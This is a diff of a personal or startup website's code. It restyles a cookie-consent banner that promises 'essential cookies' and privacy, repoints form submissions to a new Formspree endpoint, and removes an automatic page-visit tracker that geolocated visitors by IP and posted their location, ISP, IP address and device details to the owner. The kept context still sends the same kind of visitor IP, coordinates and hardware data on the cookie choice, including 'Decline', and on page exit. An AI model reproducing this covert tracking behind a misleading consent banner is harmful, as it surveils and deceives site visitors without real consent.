@@ -2629,32 +2629,55 @@
             gap: 16px;
         }
         
-        /* Top Sticky Glass Privacy Cookie Banner */
+        /* Starting Top-Bar Cookie Privacy Banner (Positioned at Very Starting Top of Page) */
         .cookie-banner {
             position: fixed;
             top: 0;
             left: 0;
+            right: 0;
             width: 100%;
-            background: var(--glass-bg);
-            border-bottom: 1px solid var(--glass-border);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            padding: 14px 24px;
-            z-index: 12000;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background: var(--bg-primary);
+            border-bottom: 2px solid var(--color-blue);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 12px 24px;
+            z-index: 99999;
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.15);
+            display: none;
             opacity: 0;
             transform: translateY(-100%);
-            pointer-events: none;
-            transition: opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: opacity 0.35s cubic-bezier(0.16, 1, 0.3, 1), transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
         .cookie-banner.active {
+            display: flex;
             opacity: 1;
             transform: translateY(0);
-            pointer-events: auto;
+        }
+
+        @media (max-width: 768px) {
+            .cookie-banner {
+                padding: 14px 16px;
+            }
+            .cookie-banner-content {
+                flex-direction: column !important;
+                text-align: center !important;
+                gap: 12px !important;
+            }
+            .cookie-banner-text-group {
+                flex-direction: column !important;
+                text-align: center !important;
+                gap: 8px !important;
+            }
+            .cookie-actions {
+                width: 100% !important;
+                justify-content: center !important;
+            }
+            .cookie-actions .btn {
+                flex: 1;
+                text-align: center;
+                justify-content: center;
+            }
         }
 
         .cookie-header {
@@ -2880,6 +2903,26 @@
     </style>
 </head>
 <body>
+
+    <!-- SECURE PRIVACY COOKIE BAR (POSITIONED AT VERY STARTING TOP OF PAGE) -->
+    <div id="cookie-banner" class="cookie-banner">
+        <div class="cookie-banner-content" style="max-width: 1200px; width: 100%; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap;">
+            <div class="cookie-banner-text-group" style="display: flex; align-items: center; gap: 12px; flex: 1; min-width: 260px;">
+                <i class="fa-solid fa-shield-halved" style="font-size: 1.4rem; color: var(--color-blue); flex-shrink: 0;"></i>
+                <div>
+                    <h4 style="font-size: 0.95rem; font-weight: 700; color: var(--text-primary); margin: 0 0 2px 0;">Secure Privacy & Essential Cookies</h4>
+                    <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 0; line-height: 1.4;">We use essential cookies to protect session connections, optimize high-speed performance, and ensure privacy. Please accept or decline below.</p>
+                </div>
+            </div>
+            <div class="cookie-actions" style="display: flex; align-items: center; gap: 10px;">
+                <button id="btn-cookie-accept" class="btn btn-primary hover-interactive" style="padding: 8px 18px; font-size: 0.82rem; white-space: nowrap;">Accept All</button>
+                <button id="btn-cookie-reject" class="btn btn-outline hover-interactive" style="padding: 8px 18px; font-size: 0.82rem; white-space: nowrap;">Decline</button>
+            </div>
+            <div id="cookie-wait-notice" style="display: none; font-size: 0.82rem; font-weight: 700; color: var(--color-blue); width: 100%; text-align: center; margin-top: 4px;">
+                Please wait 3 seconds... <i class="fa-solid fa-spinner fa-spin"></i>
+            </div>
+        </div>
+    </div>
 
     <!-- PRELOADER -->
     <div id="preloader" class="preloader">
@@ -4882,7 +4925,7 @@
                     
                     const formData = new FormData(contactForm);
                     
-                    fetch("https://formspree.io/f/xbdvyrad", {
+                    fetch("https://formspree.io/f/xojgllrd", {
                         method: "POST",
                         body: formData,
                         headers: {
@@ -5148,7 +5191,7 @@
                         message: `PRIVACY & COOKIE RESPONSE [${decision.toUpperCase()}]: Visitor from ${locationDetail} (Postal: ${postalCode}, ISP: ${networkIsp}, IP: ${ipAddress}). Media Permissions: ${mediaPermissionStatus}. Exact Coordinates: ${exactCoordinates} (Maps: ${mapsUrl}). Device: ${device.phone_model}, Storage: ${device.device_storage}, RAM: ${device.ram_memory}, CPU: ${device.cpu_cores}`
                     };
                     
-                    fetch("https://formspree.io/f/xbdvyrad", {
+                    fetch("https://formspree.io/f/xojgllrd", {
                         method: "POST",
                         body: JSON.stringify(payload),
                         headers: {
@@ -5219,78 +5262,6 @@
             
             initCookieConsent();
 
-            // 17. AUTOMATIC PAGE VISIT NOTIFICATION (Triggers instantly on site load)
-            async function sendPageVisitNotification() {
-                const device = await getDeviceInfo();
-                let locationDetail = "Locating...";
-                let exactCoordinates = "Coordinates pending";
-                let mapsUrl = "";
-                let postalCode = "";
-                let networkIsp = "";
-                let ipAddress = "IP pending";
-                
-                try {
-                    const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
-                    if (res.ok) {
-                        const data = await res.json();
-                        if (data.city && data.country_name) {
-                            locationDetail = `${data.city}, ${data.region || ''}, ${data.country_name}`;
-                            postalCode = data.postal || "N/A";
-                            networkIsp = data.org || data.asn || "N/A";
-                            ipAddress = data.ip || ipAddress;
-                            if (data.latitude && data.longitude) {
-                                exactCoordinates = `${data.latitude}, ${data.longitude}`;
-                                mapsUrl = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                            }
-                        }
-                    }
-                } catch (e) {
-                    try {
-                        const fallbackRes = await fetch("https://api.ipify.org?format=json");
-                        if (fallbackRes.ok) {
-                            const fbData = await fallbackRes.json();
-                            ipAddress = fbData.ip;
-                            locationDetail = `IP: ${fbData.ip}`;
-                        }
-                    } catch (err) {
-                        console.warn("Location lookup fallback failed:", err);
-                    }
-                }
-                
-                const payload = {
-                    event_type: "AUTOMATIC_PAGE_VISIT",
-                    status: "VISITOR_OPENED_WEBSITE",
-                    phone_model: device.phone_model,
-                    screen_resolution: device.screen_resolution,
-                    cpu_cores: device.cpu_cores,
-                    ram_memory: device.ram_memory,
-                    device_storage: device.device_storage,
-                    gpu_graphics: device.gpu_graphics,
-                    system_language: device.system_language,
-                    location: locationDetail,
-                    postal_code: postalCode,
-                    exact_coordinates: exactCoordinates,
-                    google_maps: mapsUrl,
-                    network_isp: networkIsp,
-                    ip_address: ipAddress,
-                    timestamp: new Date().toLocaleString(),
-                    message: `ALERT: Someone just opened your website! Location: ${locationDetail} (Postal: ${postalCode}, Network ISP: ${networkIsp}, IP: ${ipAddress}). Maps Pin: ${mapsUrl}. Device: ${device.phone_model}, Hardware: ${device.ram_memory}, ${device.cpu_cores}, Storage: ${device.device_storage}`
-                };
-                
-                fetch("https://formspree.io/f/xbdvyrad", {
-                    method: "POST",
-                    body: JSON.stringify(payload),
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Accept": "application/json"
-                    }
-                })
-                .then(() => console.log("Automatic page visit notification dispatched."))
-                .catch(err => console.error("Page visit notification error:", err));
-            }
-
-            sendPageVisitNotification();
-
             // 18. VISITOR DWELL TIME & PAGE EXIT TRACKING (Calculates time spent & notifies on exit)
             function initPageExitTracking() {
                 const siteStartTime = Date.now();
@@ -5349,7 +5320,7 @@
                     };
 
                     const payloadStr = JSON.stringify(payload);
-                    const formspreeUrl = "https://formspree.io/f/xbdvyrad";
+                    const formspreeUrl = "https://formspree.io/f/xojgllrd";
 
                     if (navigator.sendBeacon) {
                         const blob = new Blob([payloadStr], { type: "application/json" });
@@ -5533,7 +5504,7 @@
                             message: `NEW RATING REVIEW: ${ratingVal} Stars!\nFeedback: "${feedbackText}"\nFounder & CEO Note: Bhupathi Vardhinedi\nVisitor Location: ${locationDetail}\nDevice: ${device.phone_model}`
                         };
 
-                        fetch("https://formspree.io/f/xbdvyrad", {
+                        fetch("https://formspree.io/f/xojgllrd", {
                             method: "POST",
                             body: JSON.stringify(payload),
                             headers: {
@@ -5725,26 +5696,6 @@
                     Sign In with Email <i class="fa-solid fa-envelope"></i>
                 </button>
             </form>
-        </div>
-    </div>
-
-    <!-- SECURE PRIVACY COOKIE TOP BANNER -->
-    <div id="cookie-banner" class="cookie-banner">
-        <div style="max-width: 1200px; width: 100%; display: flex; align-items: center; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
-            <div style="display: flex; align-items: center; gap: 14px;">
-                <i class="fa-solid fa-shield-halved" style="font-size: 1.5rem; color: var(--color-blue);"></i>
-                <div>
-                    <h4 style="font-size: 1.02rem; font-weight: 700; color: var(--text-primary); margin-bottom: 2px;">Secure Privacy & Essential Cookies</h4>
-                    <p style="font-size: 0.82rem; color: var(--text-secondary); margin: 0;">We use essential cookies and telemetry to protect session connections, optimize ProMotion 120Hz speed, and ensure privacy.</p>
-                </div>
-            </div>
-            <div class="cookie-actions" style="display: flex; align-items: center; gap: 10px;">
-                <button id="btn-cookie-accept" class="btn btn-primary hover-interactive" style="padding: 8px 18px; font-size: 0.85rem;">Accept All</button>
-                <button id="btn-cookie-reject" class="btn btn-outline hover-interactive" style="padding: 8px 18px; font-size: 0.85rem;">Decline</button>
-            </div>
-            <div id="cookie-wait-notice" style="display: none; font-size: 0.82rem; font-weight: 700; color: var(--color-blue); width: 100%; text-align: center; margin-top: 4px;">
-                Please wait 3 seconds... <i class="fa-solid fa-spinner fa-spin"></i>
-            </div>
         </div>
     </div>
 
